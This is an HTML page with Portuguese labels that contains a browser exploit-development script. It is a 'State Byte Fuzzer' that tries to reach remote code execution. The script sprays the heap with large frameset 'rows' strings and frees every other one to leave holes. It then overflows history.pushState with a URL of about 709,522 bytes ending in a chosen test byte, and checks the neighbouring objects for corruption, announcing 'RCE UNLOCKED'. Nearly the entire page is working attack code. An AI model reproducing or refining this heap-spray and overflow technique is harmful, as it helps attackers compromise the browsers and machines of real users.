<!DOCTYPE html>
<html>
<head>
    <title>State Byte Fuzzer (709523)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .crash { color: red; font-weight: bold; }
        .safe { color: #0f0; font-weight: bold; }
    </style>
</head>
<body>

    <h1>State Byte Fuzzer</h1>
    <p>Focando no byte 709523. Qual valor ativa o RCE?</p>

    <button onclick="runFuzz(0x00)">Testar 0x00 (Null)</button>
    <button onclick="runFuzz(0x02)">Testar 0x02 (Bit 1)</button>
    <button onclick="runFuzz(0x03)">Testar 0x03 (Bits 0+1)</button>
    <button onclick="runFuzz(0x04)">Testar 0x04 (Bit 2)</button>
    <button onclick="runFuzz(0x08)">Testar 0x08 (Bit 3)</button>
    <button onclick="runFuzz(0x10)">Testar 0x10 (Bit 4)</button>
    <button onclick="runFuzz(0x20)">Testar 0x20 (Espaço/Bit 5)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const CRASH_OFFSET = 709522; // Até aqui é 'A'. O próximo é o byte de teste.
        const OVERFLOW_TAIL = 1024 * 64; // O que vem depois do byte de teste

        // Vítima: Frameset 1MB (O mais provável de ter header simples)
        const TARGET_SIZE = 1024 * 1024; 
        const FS_ELEMENTS = (TARGET_SIZE / 8) - 2;
        const FS_ROWS = ",".repeat(FS_ELEMENTS);

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'crash' ? 'class="crash"' : (type === 'safe' ? 'class="safe"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runFuzz(testByte) {
            log(`--- TESTANDO BYTE: 0x${testByte.toString(16)} (${testByte}) ---`);

            // 1. Spray
            victims = [];
            const SPRAY_COUNT = 60;
            
            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = FS_ROWS;
                    victims.push(fset);
                }
                
                // Buracos
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i].rows = ""; 
                    victims[i] = null;
                }
                
                await forceGC();

                // 2. Exploit
                log("Disparando...");
                setTimeout(() => {
                    try {
                        // Buffer até a borda
                        let buffer = "A".repeat(CRASH_OFFSET);
                        
                        // O BYTE DE TESTE (709523)
                        buffer += String.fromCharCode(testByte);
                        
                        // O resto (enchemos com o mesmo byte pra ver se cola)
                        buffer += String.fromCharCode(testByte).repeat(OVERFLOW_TAIL);
                        
                        history.pushState({}, "fuzz_" + testByte, "/" + buffer);

                        log("Sobreviveu! Verificando corrupção...", 'safe');
                        checkVictims(testByte);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro memória: " + e.message);
            }
        }

        function checkVictims(byteVal) {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                try {
                    // Se o byte alterou o tamanho ou flags, ler .rows pode dar erro ou tamanho errado
                    let s = fset.rows;
                    
                    if (s.length !== FS_ROWS.length) {
                        log(`!!! JACKPOT !!! Byte 0x${byteVal.toString(16)} alterou o tamanho!`, 'safe');
                        alert("RCE UNLOCKED WITH BYTE " + byteVal);
                        found = true;
                        break;
                    }
                } catch(e) {
                    log(`!!! JACKPOT (ERRO) !!! Byte 0x${byteVal.toString(16)} corrompeu o objeto!`, 'safe');
                    alert("RCE UNLOCKED WITH BYTE " + byteVal);
                    found = true;
                    break;
                }
            }
            if(!found) log("Nenhuma alteração detectada. O byte foi aceito mas não fez nada.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
